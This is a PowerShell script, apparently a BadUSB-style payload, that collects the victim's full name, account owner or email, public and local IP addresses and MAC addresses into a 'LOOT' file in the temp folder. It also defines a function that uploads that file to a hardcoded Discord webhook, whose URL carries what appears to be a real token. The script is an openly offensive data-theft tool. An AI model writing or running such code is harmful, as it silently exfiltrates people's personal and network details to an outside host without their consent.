$FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"

function Get-FullName {

    try {
        $fullName = (Get-LocalUser -Name $env:USERNAME).FullName
    }
    catch {
        Write-Error "No name was detected"
        return $env:UserName
    }

    return $fullName
}

function Get-email {
    
    try {

    $email = (Get-CimInstance CIM_ComputerSystem).PrimaryOwnerName
    return $email
    }

# If no email is detected function will return backup message for sapi speak

    # Write Error is just for troubleshooting
    catch {Write-Error "An email was not found" 
    return "No Email Detected"
    -ErrorAction SilentlyContinue
    }        
}

$email = Get-email

try {
    $computerPubIP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content
}
catch {
    $computerPubIP = "Error getting Public IP"
}

$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 |
           Select-Object InterfaceAlias, IPAddress, PrefixOrigin | 
           Format-Table -AutoSize | 
           Out-String

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*" |
       Select-Object Name, MacAddress, Status |
       Format-Table -AutoSize |
       Out-String
$output = @"

Full Name: $fullName

Email: $email

Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

"@

$output > $FileName

function Upload-Discord {

    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$file,
        [parameter(Position=1, Mandatory=$False)]
        [string]$text 
    )

    # Replace with your actual Discord webhook URL
    $hookurl = "https://discord.com/api/webhooks/1261009752851484692/B1wpTxDAqPn0aLB8pwU4FH4j1i5iAWFC86__R0DBuiMn96cbFZcx8SWPFTLEOBf-DXb8"

    $Body = @{
        'username' = $env:username
        'content' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }

    if (-not [string]::IsNullOrEmpty($file)) {
        curl.exe -F "file1=@$file" $hookurl
    }
}
